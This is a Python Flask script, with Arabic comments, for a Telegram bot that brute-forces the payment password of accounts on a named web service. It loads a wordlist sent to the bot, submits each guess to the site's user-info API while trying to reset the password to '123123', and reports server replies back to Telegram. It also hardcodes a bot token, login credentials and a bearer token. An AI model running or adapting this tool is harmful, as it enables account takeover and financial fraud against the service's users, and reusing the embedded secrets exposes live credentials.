import requests
import json
import time
from flask import Flask, request

app = Flask(__name__)

# بيانات تيليجرام
telegram_bot_token = "6724140823:AAE1pkFDNCAaKa1ahmXan8EJGyCNoTFTpg0"
telegram_api_url = f"https://api.telegram.org/bot{telegram_bot_token}"
telegram_chat_id = None

# بيانات تسجيل الدخول
login_data = {
    'username': '1281811280',
    'password': '123456',
    'lang': 'eg',
}

# التوكن المستخدم في الطلبات
token = "02c8znoKfqx8sfRg0C0p1mQ64VVuoa7vMu+wgn1rttGH04eVulqXpX0SM9mF"
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'PythonRequests',
    'Authorization': f'Bearer {token}',
}

# حالة التخمين
is_guessing = False
password_list = []
current_index = 0

# دالة إرسال رسالة تيليجرام
def send_telegram_message(chat_id, text):
    url = f"{telegram_api_url}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    requests.post(url, json=payload)

# دالة تجربة كلمة مرور
def try_password(password):
    global token
    data = {
        'o_payword': password,
        'n_payword': '123123',
        'r_payword': '123123',
        'lang': 'eg',
        'token': token,
    }
    url = "https://btsmoa.btswork.vip/api/user/setuserinfo"
    response = requests.post(url, json=data, headers=headers)
    return response.json()

# دالة بدء عملية التخمين
def start_guessing():
    global is_guessing, password_list, current_index, telegram_chat_id
    is_guessing = True
    total_passwords = len(password_list)

    while is_guessing and current_index < total_passwords:
        password = password_list[current_index]
        response = try_password(password)
        current_index += 1

        # تحديث الحالة على تيليجرام
        progress_message = f"""
<b>𝗕𝗟𝗔𝗖𝗞 𓃠 | حالة التخمين 🔥</b>

📊 <b>التقدم:</b> {current_index}/{total_passwords} كلمة مرور تمت تجربتها
📩 <b>آخر رد من السيرفر:</b> {json.dumps(response, indent=2, ensure_ascii=False)}
"""
        send_telegram_message(telegram_chat_id, progress_message)

        # انتظار بسيط لتقليل الحمل
        time.sleep(0.1)

    if current_index >= total_passwords:
        send_telegram_message(telegram_chat_id, "✅ انتهى التخمين، تم تجربة جميع كلمات المرور!")
        is_guessing = False

# استقبال الرسائل من تيليجرام
@app.route(f"/{telegram_bot_token}", methods=["POST"])
def telegram_webhook():
    global telegram_chat_id, password_list, current_index, is_guessing

    data = request.get_json()

    if "message" in data:
        message = data["message"]
        chat_id = message["chat"]["id"]
        telegram_chat_id = chat_id

        if "text" in message:
            text = message["text"]

            if text == "/start":
                send_telegram_message(chat_id, "👋 أهلاً بك! الرجاء إرسال ملف يحتوي على كلمات المرور للبدء.")
            elif text == "/stop":
                is_guessing = False
                send_telegram_message(chat_id, "⏹️ تم إيقاف عملية التخمين.")

        elif "document" in message:
            file_id = message["document"]["file_id"]
            file_url = f"{telegram_api_url}/getFile?file_id={file_id}"
            file_response = requests.get(file_url).json()

            if "result" in file_response:
                file_path = file_response["result"]["file_path"]
                download_url = f"https://api.telegram.org/file/bot{telegram_bot_token}/{file_path}"
                file_content = requests.get(download_url).text
                password_list = file_content.splitlines()
                current_index = 0

                send_telegram_message(chat_id, f"📁 تم تحميل الملف. يحتوي على {len(password_list)} كلمة مرور. يتم الآن بدء التخمين...")
                start_guessing()

    return {"ok": True}

# تشغيل السيرفر
if __name__ == "__main__":
    app.run(port=5000)
